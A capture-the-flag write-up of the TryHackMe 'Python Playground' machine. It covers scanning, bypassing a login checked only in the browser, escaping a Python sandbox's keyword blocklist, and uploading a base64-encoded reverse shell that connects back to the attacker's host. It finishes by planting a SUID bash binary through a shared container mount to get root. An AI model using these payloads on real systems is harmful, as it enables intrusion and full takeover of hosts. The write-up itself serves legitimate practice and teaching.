---
date: 2020-06-09 17:05:11
layout: post
title: "Python Playground"
subtitle: Hard Machine from Tryhackme
description:
image: /writeup/assets/img/playground/play.png
optimized_image:
category: Tryhackme
tags: Tryhackme
author:
paginate: false
---
<a href="https://tryhackme.com/room/pythonplayground">Link</a> to the machine on Tryhackme.

I started with nmap scan.
```bash
nmap -T4 -p- -A 10.10.79.248
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 22:37 IST
Nmap scan report for 10.10.79.248
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)
|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)
|_  256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (ED25519)
80/tcp open  http    Node.js Express framework
|_http-title: Python Playground!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   448.71 ms 10.9.0.1
2   448.82 ms 10.10.79.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.00 seconds

```

This showed that 2 ports, 22 and 80 are open.
Moving on to the website hosted on port 80, I found the homepage with title Secure Python Playground.
![placeholder](/writeup/assets/img/playground/site.png "site")

The Login and Signup link ended nowhere but a "Go Back" page. 

I ran ffuf to find the hidden directories and pages.
```bash
ffuf -w /root/Documents/Fuzz/fuzzdir -u "http://10.10.79.248/FUZZ" -e .php,.html,.txt,.zip

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.79.248/FUZZ
 :: Extensions       : .php .html .txt .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

admin.html              [Status: 200, Size: 3134, Words: 667, Lines: 118]
login.html              [Status: 200, Size: 549, Words: 152, Lines: 19]
index.html              [Status: 200, Size: 941, Words: 308, Lines: 30]
signup.html             [Status: 200, Size: 549, Words: 152, Lines: 19]

```

This gave me a page admin.html.The page had a login form and was using client side authentication.
![placeholder](/writeup/assets/img/playground/admin.png "admin")
The source of the page gave a link to the page a user would get redirected after login.The page worked fine without authentication.
![placeholder](/writeup/assets/img/playground/script.png "script")
```url
http://10.10.79.248/super-secret-admin-testing-panel.html
```
Now I can run python code on this page.I tried to import os but that failed and after few attempts I came to know that i can't use this word "import ".

I tried to read files on the machine and I was able to read shadow and passwd file,although they were not useful.
![placeholder](/writeup/assets/img/playground/shadow.png "shadow")

But this told me that maybe I am root on the machine the code is being ran on.

I tried to read /root/flag1.txt
and got the first flag.
```python
f=open("/root/flag1.txt","r")
print(f.read())
```

Since I had saw a hash in the javascript employed on the admin.html page. I thought to decrypt it.
I reversed all the process and got the password.
```python3
def text_to_unicode(string):
    uni=[]
    for char in string:
         a=ord(char)
         a -= 97
         uni.append(str(a))
    return uni     

def unicode_to_text(string):
    out=""
    for char in range(0,len(string),2):
         a = int(string[char])    
         b = int(string[char +1])
         temp = a * 26
         temp += b
         out += chr(temp)
    return out
     
if __name__ == "__main__":
     hash="dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu"
     stri1 = text_to_unicode(hash)
     stri2 = unicode_to_text(stri1)
     stri3 = text_to_unicode(stri2)
     password = unicode_to_text(stri3)
     print(password)
```
Used the password to login as connor user through SSH.

Got the second flag.

Now, I came to know that the website is running in a docker container and I am logged in the Host machine.

Since, the nmap scan already had given the information that the server is Node JS Express framework.I tried to read the index.js from the python code executer page.
```python3
f=open("index.js","r")
print(f.read())
```
```javascript
#index.js
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

const express = require('express');
const app = express();
const port = 3000;

app.use(express.urlencoded({
    extended: false
}));

app.use(express.static(path.join(__dirname, 'static')));

function isAllowed(code){
    if(typeof code !== 'string'){
        return false;
    }
    if(code.indexOf('import ') >= 0){
        return false;
    }
    if(code.indexOf('eval') >= 0){
        return false;
    }
    if(code.indexOf('.system') >= 0){
        return false;
    }
    if(code.indexOf('exec') >= 0){
        return false;
    }

    return true;
}

function findAndInsert(str, find, insert){
    const i = str.indexOf(find) + find.length;

    return str.slice(0, i) + insert + str.slice(i);
}

function formatOut(code, output){
    const testingPanelHTML = fs.readFileSync('static/super-secret-admin-testing-panel.html');

    const insertedInput = findAndInsert(testingPanelHTML, '<textarea class="form-control mb-3" name="code">', code);
    const insertedOutput = findAndInsert(insertedInput, '<textarea class="form-control mb-3" readonly>', output);

    return insertedOutput;
}

app.post('/super-secret-admin-testing-panel.html', (req, res) => {
    const code = req.body.code;

    if(isAllowed(code)){
        // Execute the code
        const name = `scripts/${Math.floor(Math.random() * 100000000000)}.py`;
        fs.writeFileSync(name, code);

        const python = spawn('python3', [name]);

        let output = '';
        python.stdout.on('data', (data) => {
            output += data.toString();
        })
        python.stderr.on('data', (data) => {
            output += data.toString();
        })
        python.on('close', (exit_code) => {
            fs.unlinkSync(name);

            output += '\nExit code ' + exit_code;

            res.send(formatOut(code, output));
        })
    }else {
        res.send(formatOut(code, 'Security threat detected!'));
    }
})

app.listen(port, () => console.log('Listening!'));
```

This shows that import, exec, .system, eval cannot be passed in the code.

This <a href="https://anee.me/escaping-python-jails-849c65cf306e">post</a> helped to execute those blacklisted commands.

```python3
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('ls -la')
```
![placeholder](/writeup/assets/img/playground/ls.png "ls")

I uploaded a python_pty_backconnect.py from <a href="https://github.com/infodox/python-pty-shells">python-pty-shells</a> in the form of base64 encoded string.
```
base64 -w 0 tcp_pty_backconnect.py > hash
##Copied the text in hash file
##and then ran following command to upload the file
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('echo -n IyEvdXNyL2Jpbi9weXRob24yCiIiIgpSZXZlcnNlIENvbm5lY3QgVENQIFBUWSBTaGVsbCAtIHYxLjAKaW5mb2RveCAtIGluc2VjdXJldHkubmV0ICgyMDEzKQoKR2l2ZXMgYSByZXZlcnNlIGNvbm5lY3QgUFRZIG92ZXIgVENQLgoKRm9yIGFuIGV4Y2VsbGVudCBsaXN0ZW5lciB1c2UgdGhlIGZvbGxvd2luZyBzb2NhdCBjb21tYW5kOgpzb2NhdCBmaWxlOmB0dHlgLGVjaG89MCxyYXcgdGNwNC1saXN0ZW46UE9SVAoKT3IgdXNlIHRoZSBpbmNsdWRlZCB0Y3BfcHR5X3NoZWxsX2hhbmRsZXIucHkKIiIiCmltcG9ydCBvcwppbXBvcnQgcHR5CmltcG9ydCBzb2NrZXQKCmxob3N0ID0gIjEwLjkuMTIuMTkyIiAjIFhYWDogQ0hBTkdFTUUKbHBvcnQgPSA5OTk5ICMgWFhYOiBDSEFOR0VNRQoKZGVmIG1haW4oKToKICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICBzLmNvbm5lY3QoKGxob3N0LCBscG9ydCkpCiAgICBvcy5kdXAyKHMuZmlsZW5vKCksMCkKICAgIG9zLmR1cDIocy5maWxlbm8oKSwxKQogICAgb3MuZHVwMihzLmZpbGVubygpLDIpCiAgICBvcy5wdXRlbnYoIkhJU1RGSUxFIiwnL2Rldi9udWxsJykKICAgIHB0eS5zcGF3bigiL2Jpbi9iYXNoIikKICAgIHMuY2xvc2UoKQoJCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK | base64 -d > run.py')
##This uploaded the file.
##Ran it using 
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('python2 run.py')
```

Got a reverse shell on the conatiner.

Enumerating through the container, I found some logs at /mnt/log.

Ran Linpeas in the conatiner and found that /dev/xvda2 is mounted at /mnt/log, moreover this xvda2 is not present in container rather it is present in host.
![placeholder](/writeup/assets/img/playground/linpeas.png "linpeas")

I thought maybe somehow they are connected and sharing same data.

I visited the directory where the logs are stored in Linux /var/logs and found that this location is directly linked to the /mnt/log in container and if I write something through the conatiner then that file is written with root as owner for both the host and the container.

Changed the permissions of /mnt/log directory to make /var/logs writable by connor,***chmod 777 .***

Now copied the /bin/bash binary in the host machine to the /var/logs and then ran following commands in container to make it's owner to be root and change it to SUID binary.
```bash
chown root bash
chmod u+s ./bash
```

Now ran ***./bash -p *** in host to get the root shell.
![placeholder](/writeup/assets/img/playground/root.png "root")
Got the last flag.



        

